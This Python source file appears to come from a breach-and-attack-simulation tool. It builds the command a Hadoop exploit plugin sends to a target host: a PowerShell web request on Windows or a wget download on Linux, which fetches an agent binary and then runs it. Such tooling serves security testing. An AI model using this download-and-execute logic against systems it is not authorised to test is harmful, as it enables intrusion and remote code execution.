import logging

from agentpluginapi import TargetHost
from monkeytypes import OperatingSystem

from common.command_builder import (
    DropperExecutionMode,
    IAgentCommandBuilderFactory,
    LinuxDownloadMethod,
    LinuxDownloadOptions,
    LinuxRunOptions,
    WindowsDownloadMethod,
    WindowsDownloadOptions,
    WindowsRunOptions,
    WindowsShell,
)

logger = logging.getLogger(__name__)


def build_hadoop_command(
    target_host: TargetHost,
    agent_destination_path: str,
    agent_download_url: str,
    agent_command_builder_factory: IAgentCommandBuilderFactory,
) -> str:
    agent_command_builder = None
    download_options = None
    run_options = None
    if target_host.operating_system in [
        OperatingSystem.WINDOWS,
        None,  # if unknown OS, default to Windows (based on
        # https://www.shodan.io/search/facet?query=hadoop&facet=os)
    ]:
        download_options = WindowsDownloadOptions(
            agent_destination_path=agent_destination_path,
            download_method=WindowsDownloadMethod.WEB_REQUEST,
            download_url=agent_download_url,
        )

        run_options = WindowsRunOptions(
            agent_destination_path=agent_destination_path,
            dropper_execution_mode=DropperExecutionMode.NONE,
            shell=WindowsShell.POWERSHELL,
        )

        agent_command_builder = agent_command_builder_factory.create_windows_agent_command_builder()

    else:
        download_options = LinuxDownloadOptions(
            agent_destination_path=agent_destination_path,
            download_method=LinuxDownloadMethod.WGET,
            download_url=agent_download_url,
        )

        run_options = LinuxRunOptions(
            agent_destination_path=agent_destination_path,
            dropper_execution_mode=DropperExecutionMode.NONE,
        )

        agent_command_builder = agent_command_builder_factory.create_linux_agent_command_builder()

    agent_command_builder.build_download_command(download_options)
    agent_command_builder.build_run_command(run_options)
    command = agent_command_builder.get_command()
    logger.debug(f"COMMAND: {command}")
    return command
